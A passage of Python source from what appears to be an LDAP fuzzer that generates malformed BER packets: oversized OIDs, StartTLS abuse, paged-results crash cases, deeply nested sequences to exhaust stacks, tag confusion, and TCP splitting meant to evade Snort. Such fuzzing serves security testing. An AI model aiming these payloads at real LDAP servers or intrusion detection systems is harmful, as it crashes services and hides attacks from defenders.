                             _tlv(_T_SET, _octet_string(big_val)))
        changes = _sequence(_enumerated(2) + attr_mod)  # replace(2)
        return _clamp(_modify_request(mid, b"cn=test,dc=example,dc=com", changes)), 389
    # circular_moddn: ModDN with newSuperior pointing to self
    dn = b"cn=test,dc=example,dc=com"
    moddn_body = (_octet_string(dn) + _octet_string(b"cn=test") +
                  _boolean(True) + _ctx(0x80, dn))  # newSuperior [0]
    return _ldap_message(mid, _ctx(_APP_MODDN_REQUEST, moddn_body)), 389


# ── Strategy 10: Extended / StartTLS abuse ────────────────────────────────
def _build_extended_starttls_abuse():
    """ExtendedRequest manipulation: StartTLS + non-TLS, unknown OIDs,
    malformed OID strings."""
    variant = random.choice([
        "starttls_then_data", "double_starttls", "unknown_oid",
        "malformed_oid", "missing_oid", "oversized_value", "who_am_i_huge",
    ])
    mid = _mid()
    if variant == "starttls_then_data":
        # StartTLS request followed immediately by plaintext bind
        ext = _extended_request(mid, _OID_STARTTLS)
        bind = _simple_bind(mid + 1)
        return ext + bind, 389
    if variant == "double_starttls":
        ext1 = _extended_request(mid, _OID_STARTTLS)
        ext2 = _extended_request(mid + 1, _OID_STARTTLS)
        return ext1 + ext2, 389
    if variant == "unknown_oid":
        evil_oid = random.choice([
            b"9.9.9.9.9.9.9.9.9.9",
            b"1.2.3.4.5.6.7.8.9.0.1.2.3.4.5.6.7.8.9.0",
            b"2.999.999.999.999.999",
        ])
        big_val = bytes(random.choices(range(256), k=random.randint(100, 50000)))
        return _clamp(_extended_request(mid, evil_oid, big_val)), 389
    if variant == "malformed_oid":
        evil_oid = random.choice([
            b"", b"..1.2.3", b"1.2.", b"-1.2.3", b"1.2.3.4.5.6.7.8\x00.9",
            b"abc.def.ghi", b"1" * 1000,
        ])
        return _extended_request(mid, evil_oid), 389
    if variant == "missing_oid":
        # ExtendedRequest with no requestName (missing [0] element)
        return _ldap_message(mid, _ctx(_APP_EXTENDED_REQUEST, b"")), 389
    if variant == "oversized_value":
        big_val = bytes(random.choices(range(256), k=60000))
        return _clamp(_extended_request(mid, _OID_STARTTLS, big_val)), 389
    # who_am_i_huge: Who Am I? with unexpected large value
    return _clamp(_extended_request(mid, _OID_WHO_AM_I,
                                     bytes(random.choices(range(256), k=40000)))), 389


# ── Strategy 11: Control injection ────────────────────────────────────────
def _build_control_injection():
    """Manipulate LDAP controls: unknown OIDs with critical=TRUE, paged results
    with page_size=0, oversized control sequences."""
    variant = random.choice([
        "unknown_critical", "paged_zero", "paged_negative", "too_many_controls",
        "malformed_value", "duplicate_control", "control_on_unbind",
    ])
    mid = _mid()
    search = _search_request(mid)
    if variant == "unknown_critical":
        ctrl = _control(b"9.9.9.9.9.9.9.9.9", critical=True,
                        value=bytes(random.choices(range(256), k=random.randint(10, 1000))))
        body = _integer(mid) + _ctx(_APP_SEARCH_REQUEST,
                    _octet_string(b"dc=example,dc=com") + _enumerated(2) +
                    _enumerated(0) + _integer(0) + _integer(0) + _boolean(False) +
                    _present_filter(b"objectClass") + _sequence(b""))
        body += _ctx(0xA0, ctrl)
        return _sequence(body), 389
    if variant == "paged_zero":
        # Paged results with pageSize=0 — known crash vector
        page_val = _sequence(_integer(0) + _octet_string(b""))
        ctrl = _control(_OID_PAGED_RESULTS, critical=True, value=page_val)
        body = _integer(mid) + _ctx(_APP_SEARCH_REQUEST,
                    _octet_string(b"dc=example,dc=com") + _enumerated(2) +
                    _enumerated(0) + _integer(0) + _integer(0) + _boolean(False) +
                    _present_filter(b"objectClass") + _sequence(b""))
        body += _ctx(0xA0, ctrl)
        return _sequence(body), 389
    if variant == "paged_negative":
        page_val = _sequence(_raw_integer(b"\xFF\xFF\xFF\xFF") + _octet_string(b""))
        ctrl = _control(_OID_PAGED_RESULTS, critical=True, value=page_val)
        body = _integer(mid) + _ctx(_APP_SEARCH_REQUEST,
                    _octet_string(b"dc=example,dc=com") + _enumerated(2) +
                    _enumerated(0) + _integer(0) + _integer(0) + _boolean(False) +
                    _present_filter(b"objectClass") + _sequence(b""))
        body += _ctx(0xA0, ctrl)
        return _sequence(body), 389
    if variant == "too_many_controls":
        ctrls = b""
        for i in range(200):
            ctrls += _control(f"1.2.3.4.5.{i}".encode(), critical=bool(i % 2))
        body = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b""))
        body += _ctx(0xA0, ctrls)
        return _clamp(_sequence(body)), 389
    if variant == "malformed_value":
        # Control value is garbage BER
        ctrl = _control(_OID_PAGED_RESULTS, critical=True,
                        value=bytes(random.choices(range(256), k=500)))
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b"")),
                    controls=ctrl), 389
    if variant == "duplicate_control":
        ctrl = _control(_OID_PAGED_RESULTS, critical=True,
                        value=_sequence(_integer(100) + _octet_string(b"")))
        ctrls = ctrl + ctrl + ctrl  # 3 identical paged results controls
        return _ldap_message(mid, _ctx(_APP_SEARCH_REQUEST,
                    _octet_string(b"dc=example,dc=com") + _enumerated(2) +
                    _enumerated(0) + _integer(0) + _integer(0) + _boolean(False) +
                    _present_filter(b"objectClass") + _sequence(b"")),
                    controls=ctrls), 389
    # control_on_unbind: Controls on an UnbindRequest (unusual)
    ctrl = _control(b"1.2.3.4.5.6.7.8.9", critical=True, value=b"unbind_ctrl")
    unbind = bytes([_APP_UNBIND_REQUEST, 0x00])
    body = _integer(mid) + unbind + _ctx(0xA0, ctrl)
    return _sequence(body), 389


# ── Strategy 12: Nested SEQUENCE bomb (stack exhaustion) ──────────────────
def _build_nested_sequence_bomb():
    """Deeply nested BER SEQUENCE elements to exhaust stack/recursion in both
    IDS parsers and LDAP servers."""
    variant = random.choice([
        "deep_seq", "deep_in_dn", "alternating", "deep_control_value",
    ])
    mid = _mid()
    if variant == "deep_seq":
        inner = _octet_string(b"x")
        for _ in range(1500):
            inner = _sequence(inner)
        body = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + inner + _ctx(0x80, b""))
        return _clamp(_sequence(body)), 389
    if variant == "deep_in_dn":
        # Pack nested sequences inside the DN octet string value
        inner = b"cn=test"
        for _ in range(800):
            inner = _sequence(_octet_string(inner))
        # Use raw bytes as DN (will be invalid but tests parser depth)
        bind = _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(inner) + _ctx(0x80, b""))
        return _clamp(_ldap_message(mid, bind)), 389
    if variant == "alternating":
        inner = _octet_string(b"y")
        for i in range(600):
            tag = _T_SEQUENCE if i % 2 == 0 else _T_SET
            inner = _tlv(tag, inner)
        body = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(inner) + _ctx(0x80, b""))
        return _clamp(_sequence(body)), 389
    # deep_control_value: nesting inside a control value
    inner = _octet_string(b"z")
    for _ in range(1000):
        inner = _sequence(inner)
    ctrl = _control(b"1.2.3.4.5.6.7.8.9", critical=False, value=inner)
    bind = _ctx(_APP_BIND_REQUEST,
                _integer(3) + _octet_string(b"") + _ctx(0x80, b""))
    return _clamp(_ldap_message(mid, bind, controls=ctrl)), 389


# ── Strategy 13: TCP segment evasion ──────────────────────────────────────
def _build_tcp_segment_evasion(payload_override=None):
    """LDAP is TCP-based: exploit Snort's lack of LDAP-aware reassembly by
    splitting critical BER structures across TCP segments. The main loop
    handles the actual splitting; we return the payload and a suggested split_at."""
    if payload_override is not None:
        mid = _mid()
        return _simple_bind(mid, dn=payload_override, password=b"secret"), 389
    variant = random.choice([
        "split_outer_hdr", "split_dn", "split_filter", "one_byte_segments",
        "split_mid_length", "psh_boundary", "interleaved_binds",
    ])
    mid = _mid()
    dn = b"cn=admin,dc=example,dc=com"
    if variant == "split_outer_hdr":
        # Split at byte 1 (between SEQUENCE tag and length)
        return _simple_bind(mid, dn=dn, password=b"secret"), 389
    if variant == "split_dn":
        # Build a bind with a known DN and suggest splitting inside the DN value
        payload = _simple_bind(mid, dn=dn, password=b"secret")
        return payload, 389
    if variant == "split_filter":
        filt = _equality_filter(b"objectClass", b"person")
        payload = _search_request(mid, dn, filter_bytes=filt)
        return payload, 389
    if variant == "one_byte_segments":
        return _simple_bind(mid, dn=dn, password=b"secret"), 389
    if variant == "split_mid_length":
        # Use non-minimal length so we can split inside it
        body_dn = bytes([_T_OCTET_STRING]) + _ber_len_long(len(dn), 4) + dn
        bind = _ctx(_APP_BIND_REQUEST, _integer(3) + body_dn + _ctx(0x80, b"secret"))
        payload = _ldap_message(mid, bind)
        return payload, 389
    if variant == "psh_boundary":
        filt = _ctx(_FILTER_AND,
                    _equality_filter(b"cn", b"admin") +
                    _present_filter(b"objectClass"))
        return _search_request(mid, dn, filter_bytes=filt), 389
    # interleaved_binds: multiple LDAP messages concatenated (pipeline)
    payload = b""
    for i in range(10):
        payload += _simple_bind(mid + i, dn=dn, password=b"p" * (i + 1))
    return _clamp(payload), 389


# ── Strategy 14: Version / PDU tag confusion ──────────────────────────────
def _build_version_pdu_tag_confusion():
    """Wrong/swapped application-class tags, invalid protocol version, mix
    LDAPv2/v3 semantics, private-class tags."""
    variant = random.choice([
        "wrong_app_tag", "private_class", "v2_search", "multibyte_app_tag",
        "primitive_constructed_flip", "undefined_app", "tag_swap",
    ])
    mid = _mid()
    dn = b"dc=example,dc=com"
    if variant == "wrong_app_tag":
        # BindRequest tag (0x60) wrapping a SearchRequest body
        search_body = (_octet_string(dn) + _enumerated(2) + _enumerated(0) +
                       _integer(0) + _integer(0) + _boolean(False) +
                       _present_filter(b"objectClass") + _sequence(b""))
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST, search_body)), 389
    if variant == "private_class":
        # Use private-class tags (0xE0+) where application-class is expected
        private_tag = random.choice([0xE0, 0xE1, 0xEF, 0xFF])
        bind_body = _integer(3) + _octet_string(dn) + _ctx(0x80, b"")
        return _ldap_message(mid, _ctx(private_tag, bind_body)), 389
    if variant == "v2_search":
        # version=2 but using v3-only operations
        bind = _ctx(_APP_BIND_REQUEST,
                    _integer(2) + _octet_string(dn) + _ctx(0x80, b"secret"))
        return _ldap_message(mid, bind), 389
    if variant == "multibyte_app_tag":
        # Multi-byte tag encoding for APPLICATION 0 (normally just 0x60)
        # 0x7F 0x00 = application class, constructed, tag 0 in multi-byte
        evil_bind = bytes([0x7F, 0x00]) + _ber_len(0)
        body = _integer(3) + _octet_string(dn) + _ctx(0x80, b"")
        evil_op = bytes([0x7F, 0x00]) + _ber_len(len(body)) + body
        return _sequence(_integer(mid) + evil_op), 389
    if variant == "primitive_constructed_flip":
        # BindRequest as primitive (0x40) instead of constructed (0x60)
        bind_body = _integer(3) + _octet_string(dn) + _ctx(0x80, b"")
        evil_op = bytes([0x40]) + _ber_len(len(bind_body)) + bind_body
        return _sequence(_integer(mid) + evil_op), 389
    if variant == "undefined_app":
        # APPLICATION 30 — undefined operation type
        app_tag = 0x60 | 30  # 0x7E — application, constructed, tag 30
        body = _octet_string(dn)
        return _ldap_message(mid, _ctx(app_tag, body)), 389
    # tag_swap: SearchRequest tag on DeleteRequest body and vice versa
    del_body = dn
    evil_op = bytes([_APP_SEARCH_REQUEST]) + _ber_len(len(del_body)) + del_body
    return _sequence(_integer(mid) + evil_op), 389


# ── Dispatcher ──────────────────────────────────────────────────────────
_BUILDERS = {
    "ber_length_overflow":         _build_ber_length_overflow,
    "ber_nonminimal_encoding":     _build_ber_nonminimal_encoding,
    "ber_indefinite_constructed":  _build_ber_indefinite_constructed,
    "truncated_tlv":               _build_truncated_tlv,
    "bind_auth_confusion":         _build_bind_auth_confusion,
    "search_filter_bomb":          _build_search_filter_bomb,
    "search_request_malform":      _build_search_request_malform,
    "message_id_confusion":        _build_message_id_confusion,
    "modify_add_dn_overflow":      _build_modify_add_dn_overflow,
    "extended_starttls_abuse":     _build_extended_starttls_abuse,
    "control_injection":           _build_control_injection,
    "nested_sequence_bomb":        _build_nested_sequence_bomb,
    "tcp_segment_evasion":         _build_tcp_segment_evasion,
    "version_pdu_tag_confusion":   _build_version_pdu_tag_confusion,
}


_LDAP_OVERRIDE_CAPABLE = frozenset(["ber_indefinite_constructed", "tcp_segment_evasion"])

def build_ldap_payload(strategy: str, payload_override=None):
    """Return (payload_bytes, dst_port) for the given strategy."""
    builder = _BUILDERS.get(strategy)
    if builder is None:
        builder = _build_ber_length_overflow
    if payload_override is not None and strategy in _LDAP_OVERRIDE_CAPABLE:
        payload, dst_port = builder(payload_override=payload_override)
    else:
        payload, dst_port = builder()
    return _clamp(payload), dst_port


# ── Mutator class ──────────────────────────────────────────────────────────
class LdapMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = LDAP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return LDAP_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_ldap_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
